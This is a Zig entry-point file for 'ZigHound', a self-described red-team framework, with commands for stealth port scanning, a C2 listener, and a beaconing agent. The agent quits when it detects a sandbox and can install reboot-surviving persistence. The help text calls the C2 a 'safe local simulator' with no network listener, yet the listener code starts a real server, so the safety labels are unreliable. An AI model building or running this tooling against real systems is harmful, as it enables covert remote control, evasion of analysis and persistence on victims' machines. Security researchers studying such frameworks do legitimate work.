// Copyright (c) 2025 il1v3y. All Rights Reserved.
// Unauthorized copying or use of this file is strictly prohibited.
// Proprietary and confidential.

const std = @import("std");
const Scanner = @import("scanner.zig").Scanner;
const c2 = @import("c2.zig");
const Server = @import("server.zig").Server;
const Agent = @import("agent.zig").Agent;
const Evasion = @import("evasion.zig").Evasion;
const Exploit = @import("exploit.zig").Exploit;
const Ui = @import("ui.zig").Ui;

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{ .thread_safe = true }){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);

    if (args.len < 2) {
        printHelp();
        return;
    }

    const command = args[1];

    if (std.mem.eql(u8, command, "scan")) {
        try handleScan(allocator, args[2..]);
    } else if (std.mem.eql(u8, command, "c2")) {
        try handleC2(allocator, args[2..]);
    } else if (std.mem.eql(u8, command, "agent")) {
        try handleAgent(allocator, args[2..]);
    } else if (std.mem.eql(u8, command, "evasion")) {
        try handleEvasion(args[2..]);
    } else if (std.mem.eql(u8, command, "--help") or std.mem.eql(u8, command, "-h")) {
        printHelp();
    } else if (std.mem.eql(u8, command, "--version")) {
        std.debug.print("ZigHound v0.1.0 - Red Team Network Framework (Safe Simulation)\n", .{});
    } else {
        std.debug.print("Unknown command: {s}\n", .{command});
        printHelp();
    }
}

fn handleScan(allocator: std.mem.Allocator, args: []const []const u8) !void {
    var target: ?[]const u8 = null;
    var ports_str: []const u8 = "22,80,443,3389,445,8080";
    var stealth: bool = false;
    var jitter: u32 = 0;
    var output_file: ?[]const u8 = null;
    var concurrency: u16 = 128;
    var format_str: ?[]const u8 = null;
    var verbose: bool = true;
    var quiet: bool = false;
    var color: bool = true;
    var progress: bool = true;
    var timeout_ms: u32 = 0;
    var rate_limit: u32 = 0;
    var run_exploits: bool = false;

    var i: usize = 0;
    while (i < args.len) : (i += 1) {
        if (std.mem.eql(u8, args[i], "--target")) {
            i += 1;
            if (i < args.len) target = args[i];
        } else if (std.mem.eql(u8, args[i], "--ports")) {
            i += 1;
            if (i < args.len) ports_str = args[i];
        } else if (std.mem.eql(u8, args[i], "--stealth")) {
            stealth = true;
        } else if (std.mem.eql(u8, args[i], "--exploits")) {
            run_exploits = true;
        } else if (std.mem.eql(u8, args[i], "--jitter")) {
            i += 1;
            if (i < args.len) {
                jitter = try std.fmt.parseInt(u32, args[i], 10);
            }
        } else if (std.mem.eql(u8, args[i], "--output")) {
            i += 1;
            if (i < args.len) output_file = args[i];
        } else if (std.mem.eql(u8, args[i], "--concurrency")) {
            i += 1;
            if (i < args.len) {
                concurrency = try std.fmt.parseInt(u16, args[i], 10);
            }
        } else if (std.mem.eql(u8, args[i], "--format")) {
            i += 1;
            if (i < args.len) format_str = args[i];
        } else if (std.mem.eql(u8, args[i], "--quiet")) {
            quiet = true;
            verbose = false;
        } else if (std.mem.eql(u8, args[i], "--verbose")) {
            quiet = false;
            verbose = true;
        } else if (std.mem.eql(u8, args[i], "--no-color")) {
            color = false;
        } else if (std.mem.eql(u8, args[i], "--no-progress")) {
            progress = false;
        } else if (std.mem.eql(u8, args[i], "--timeout")) {
            i += 1;
            if (i < args.len) {
                timeout_ms = try std.fmt.parseInt(u32, args[i], 10);
            }
        } else if (std.mem.eql(u8, args[i], "--rate")) {
            i += 1;
            if (i < args.len) {
                rate_limit = try std.fmt.parseInt(u32, args[i], 10);
            }
        }
    }

    if (target == null) {
        std.debug.print("Error: --target required\n", .{});
        return;
    }

    var format: Scanner.ReportFormat = .auto;
    if (format_str) |text| {
        format = parseReportFormat(text) catch {
            std.debug.print("Error: invalid --format (use json, csv, auto, none)\n", .{});
            return;
        };
    }

    const ui = Ui{ .color = color };
    ui.banner();
    ui.tagline("ZigHound v0.1.0 :: Safe Simulation Mode");
    ui.section("SCAN");
    ui.kv("Target", target.?);
    ui.kv("Ports", ports_str);
    if (stealth) ui.warn("- Stealth mode enabled\n", .{});
    if (jitter > 0) ui.kvFormat("Jitter (ms)", "{d}", .{jitter});
    ui.kvFormat("Concurrency", "{d}", .{concurrency});

    var scanner = Scanner.init(allocator);
    defer scanner.deinit();

    const options = Scanner.ScanOptions{
        .stealth = stealth,
        .jitter_ms = jitter,
        .concurrency = concurrency,
        .timeout_ms = timeout_ms,
        .rate_limit = rate_limit,
        .output_file = output_file,
        .format = format,
        .verbose = verbose,
        .quiet = quiet,
        .color = color,
        .progress = progress,
    };

    try scanner.scanTarget(target.?, ports_str, options);

    if (run_exploits) {
        ui.section("LATERAL MOVEMENT (Basic Exploits)");
        std.debug.print("[-] Exploits disabled in this release due to CI compatibility issues.\n", .{});
        // var exploit_mod = Exploit.init(allocator);
        // for (scanner.results.items) |result| {
        //     if (std.mem.eql(u8, result.status, "open")) {
        //         exploit_mod.scanTarget(result.ip, result.port) catch |err| {
        //             std.debug.print("[-] Exploit error on {s}:{d}: {}\n", .{ result.ip, result.port, err });
        //         };
        //     }
        // }
    }
}

fn parseReportFormat(text: []const u8) !Scanner.ReportFormat {
    if (std.mem.eql(u8, text, "json")) return .json;
    if (std.mem.eql(u8, text, "csv")) return .csv;
    if (std.mem.eql(u8, text, "ndjson")) return .ndjson;
    if (std.mem.eql(u8, text, "sarif")) return .sarif;
    if (std.mem.eql(u8, text, "auto")) return .auto;
    if (std.mem.eql(u8, text, "none")) return .none;
    return error.InvalidFormat;
}

fn handleC2(allocator: std.mem.Allocator, args: []const []const u8) !void {
    if (args.len == 0) {
        printC2Help();
        return;
    }

    const subcommand = args[0];

    if (std.mem.eql(u8, subcommand, "listen")) {
        try handleC2Listen(allocator, args[1..]);
    } else if (std.mem.eql(u8, subcommand, "beacon")) {
        try handleC2Beacon(allocator, args[1..]);
    } else if (std.mem.eql(u8, subcommand, "exec")) {
        try handleC2Exec(allocator, args[1..]);
    } else if (std.mem.eql(u8, subcommand, "list")) {
        try handleC2List(allocator, args[1..]);
    } else {
        std.debug.print("Unknown C2 subcommand: {s}\n", .{subcommand});
        printC2Help();
    }
}

fn handleC2Listen(allocator: std.mem.Allocator, args: []const []const u8) !void {
    var port: u16 = 443;
    var psk: []const u8 = "zighound-default-psk";
    var color: bool = true;

    var i: usize = 0;
    while (i < args.len) : (i += 1) {
        if (std.mem.eql(u8, args[i], "--port")) {
            i += 1;
            if (i < args.len) {
                port = try std.fmt.parseInt(u16, args[i], 10);
            }
        } else if (std.mem.eql(u8, args[i], "--psk")) {
            i += 1;
            if (i < args.len) psk = args[i];
        } else if (std.mem.eql(u8, args[i], "--no-color")) {
            color = false;
        }
    }

    const ui = Ui{ .color = color };
    ui.banner();
    ui.tagline("ZigHound v0.1.0 :: Real C2 Mode");
    ui.section("C2 LISTENER");
    ui.kvFormat("Port", "{d}", .{port});
    ui.kv("Protocol", "HTTP/1.1 (Encrypted)");

    var server = try Server.init(allocator, port, psk);
    defer server.deinit();

    try server.start();
}

fn handleAgent(allocator: std.mem.Allocator, args: []const []const u8) !void {
    var c2_host: []const u8 = "127.0.0.1";
    var c2_port: u16 = 443;
    var psk: []const u8 = "zighound-default-psk";
    var jitter: u32 = 5000;
    var install: bool = false;

    var i: usize = 0;
    while (i < args.len) : (i += 1) {
        if (std.mem.eql(u8, args[i], "--host")) {
            i += 1;
            if (i < args.len) c2_host = args[i];
        } else if (std.mem.eql(u8, args[i], "--port")) {
            i += 1;
            if (i < args.len) {
                c2_port = try std.fmt.parseInt(u16, args[i], 10);
            }
        } else if (std.mem.eql(u8, args[i], "--psk")) {
            i += 1;
            if (i < args.len) psk = args[i];
        } else if (std.mem.eql(u8, args[i], "--jitter")) {
            i += 1;
            if (i < args.len) {
                jitter = try std.fmt.parseInt(u32, args[i], 10);
            }
        } else if (std.mem.eql(u8, args[i], "--install")) {
            install = true;
        }
    }

    std.debug.print("[*] Starting ZigHound Agent...\n", .{});

    if (Evasion.isAnalysisEnvironment()) {
        std.debug.print("[!] Environment analysis detected. Terminating.\n", .{});
        return;
    }

    std.debug.print("[*] C2: {s}:{d}\n", .{ c2_host, c2_port });

    var agent = try Agent.init(allocator, c2_host, c2_port, psk, jitter);
    defer agent.deinit();

    if (install) {
        agent.installPersistence() catch |err| {
            std.debug.print("[-] Persistence installation failed: {}\n", .{err});
        };
    }

    try agent.run();
}

fn handleC2Beacon(allocator: std.mem.Allocator, args: []const []const u8) !void {
    var listener: ?[]const u8 = null;
    var jitter: u32 = 5;
    var state_path: []const u8 = c2.default_state_file;
    var color: bool = true;

    var i: usize = 0;
    while (i < args.len) : (i += 1) {
        if (std.mem.eql(u8, args[i], "--listener")) {
            i += 1;
            if (i < args.len) listener = args[i];
        } else if (std.mem.eql(u8, args[i], "--jitter")) {
            i += 1;
            if (i < args.len) {
                jitter = try std.fmt.parseInt(u32, args[i], 10);
            }
        } else if (std.mem.eql(u8, args[i], "--state")) {
            i += 1;
            if (i < args.len) state_path = args[i];
        } else if (std.mem.eql(u8, args[i], "--no-color")) {
            color = false;
        }
    }

    if (listener == null) {
        std.debug.print("Error: --listener required (format: host:port)\n", .{});
        return;
    }

    var state = try c2.loadState(allocator, state_path);
    defer state.deinit();

    const beacon_id = try c2.registerBeacon(&state, listener.?, jitter);
    try c2.saveState(&state, state_path);

    const ui = Ui{ .color = color };
    ui.banner();
    ui.tagline("ZigHound v0.1.0 :: Safe Simulation Mode");
    ui.section("C2");
    ui.kv("Listener", listener.?);
    ui.kvFormat("Jitter (s)", "{d}", .{jitter});
    ui.kv("Beacon ID", beacon_id);
    ui.info("[*] Simulation mode: no payload generated.\n", .{});
}

fn handleC2Exec(allocator: std.mem.Allocator, args: []const []const u8) !void {
    var beacon_id: ?[]const u8 = null;
    var cmd: ?[]const u8 = null;
    var state_path: []const u8 = c2.default_state_file;
    var color: bool = true;

    var i: usize = 0;
    while (i < args.len) : (i += 1) {
        if (std.mem.eql(u8, args[i], "--beacon-id")) {
            i += 1;
            if (i < args.len) beacon_id = args[i];
        } else if (std.mem.eql(u8, args[i], "--cmd")) {
            i += 1;
            if (i < args.len) cmd = args[i];
        } else if (std.mem.eql(u8, args[i], "--state")) {
            i += 1;
            if (i < args.len) state_path = args[i];
        } else if (std.mem.eql(u8, args[i], "--no-color")) {
            color = false;
        }
    }

    if (beacon_id == null or cmd == null) {
        std.debug.print("Error: --beacon-id and --cmd required\n", .{});
        return;
    }

    var state = try c2.loadState(allocator, state_path);
    defer state.deinit();

    const command_id = c2.queueCommand(&state, beacon_id.?, cmd.?) catch |err| {
        switch (err) {
            error.BeaconNotFound => std.debug.print("[-] Beacon not found: {s}\n", .{beacon_id.?}),
            error.InvalidCommand => std.debug.print("[-] Command contains unsupported characters\n", .{}),
            else => return err,
        }
        return;
    };

    try c2.saveState(&state, state_path);

    const ui = Ui{ .color = color };
    ui.banner();
    ui.tagline("ZigHound v0.1.0 :: Safe Simulation Mode");
    ui.section("C2");
    ui.info("[*] Command queued in simulator (ID: {d})\n", .{command_id});
}

fn handleC2List(allocator: std.mem.Allocator, args: []const []const u8) !void {
    var state_path: []const u8 = c2.default_state_file;
    var show_commands = false;
    var color: bool = true;

    var i: usize = 0;
    while (i < args.len) : (i += 1) {
        if (std.mem.eql(u8, args[i], "--state")) {
            i += 1;
            if (i < args.len) state_path = args[i];
        } else if (std.mem.eql(u8, args[i], "--commands")) {
            show_commands = true;
        } else if (std.mem.eql(u8, args[i], "--no-color")) {
            color = false;
        }
    }

    var state = try c2.loadState(allocator, state_path);
    defer state.deinit();

    const ui = Ui{ .color = color };
    ui.banner();
    ui.tagline("ZigHound v0.1.0 :: Safe Simulation Mode");
    ui.section("C2");
    c2.listBeacons(&state);
    if (show_commands) {
        c2.listCommands(&state);
    }
}

fn handleEvasion(args: []const []const u8) !void {
    _ = args;
    std.debug.print("[*] Running Evasion/Anti-Analysis Checks...\n", .{});
    
    if (Evasion.isAnalysisEnvironment()) {
        std.debug.print("[!] ANALYSIS DETECTED! This machine appears to be a sandbox.\n", .{});
        std.debug.print("    - Check CPU Cores: FAIL (< 2)\n", .{});
        std.debug.print("    - Check Time Distortion: FAIL (Sleep skipped)\n", .{});
    } else {
        std.debug.print("[+] Environment appears CLEAN.\n", .{});
        std.debug.print("    - CPU Cores: OK\n", .{});
        std.debug.print("    - Time Check: OK\n", .{});
    }
}

fn printHelp() void {
    std.debug.print(
        \\⚡ ZigHound v0.1.0 - Red Team Network Framework
        \\
        \\USAGE:
        \\    zighound <COMMAND> [OPTIONS]
        \\
        \\COMMANDS:
        \\    scan <target>     Network reconnaissance & port scanning
        \\    c2 listen         Start a real C2 listener (TCP/Encrypted)
        \\    agent             Start a real agent
        \\    evasion           Evasion simulation utilities
        \\    --help            Show this message
        \\    --version         Show version
        \\
        \\C2 LISTEN OPTIONS:
        \\    --port <PORT>       Listener port (default: 443)
        \\    --psk <STRING>      Pre-shared key for encryption
        \\
        \\AGENT OPTIONS:
        \\    --host <IP>         C2 server address (default: 127.0.0.1)
        \\    --port <PORT>       C2 server port (default: 443)
        \\    --psk <STRING>      Pre-shared key (must match server)
        \\    --jitter <MS>       Beacon interval jitter
        \\    --install           Install persistence (reboot survival)
        \\
        \\SCAN OPTIONS:
        \\    --target <CIDR>          Target network (required)
        \\    --ports <LIST>           Comma-separated ports
        \\    --stealth                Enable stealth mode
        \\    --jitter <MS>            Timing jitter
        \\
        \\EXAMPLES:
        \\    zighound c2 listen --port 4444 --psk mysecret
        \\    zighound agent --host 10.0.0.5 --port 4444 --psk mysecret
        \\
    , .{});
}

fn printC2Help() void {
    std.debug.print(
        \\⚡ ZigHound C2 - Safe Local Simulator
        \\
        \\USAGE:
        \\    zighound c2 <SUBCOMMAND> [OPTIONS]
        \\
        \\SUBCOMMANDS:
        \\    listen              Create simulation state (no network listener)
        \\    beacon              Register a simulated beacon
        \\    exec                Queue a simulated command
        \\    list                Show simulated beacons (and commands)
        \\
        \\LISTEN OPTIONS:
        \\    --port <PORT>       Listener port (simulation only)
        \\    --encrypt <ALGO>    Label only, no real crypto
        \\    --state <FILE>      State file (default: .zighound_c2_sim.txt)
        \\    --no-color          Disable ANSI colors
        \\
        \\BEACON OPTIONS:
        \\    --listener <HOST:PORT>   C2 server address label
        \\    --jitter <SECONDS>       Beacon callback interval jitter
        \\    --state <FILE>            State file
        \\    --no-color               Disable ANSI colors
        \\
        \\EXEC OPTIONS:
        \\    --beacon-id <ID>    Target beacon ID
        \\    --cmd <COMMAND>     Command to queue (simulation only)
        \\    --state <FILE>      State file
        \\    --no-color          Disable ANSI colors
        \\
        \\LIST OPTIONS:
        \\    --state <FILE>      State file
        \\    --commands          Show queued commands
        \\    --no-color          Disable ANSI colors
        \\
        \\EXAMPLES:
        \\    zighound c2 listen --port 443
        \\    zighound c2 beacon --listener 192.168.1.100:443 --jitter 5
        \\    zighound c2 exec --beacon-id sim-1a2b3c --cmd "whoami"
        \\    zighound c2 list --commands
        \\
    , .{});
}

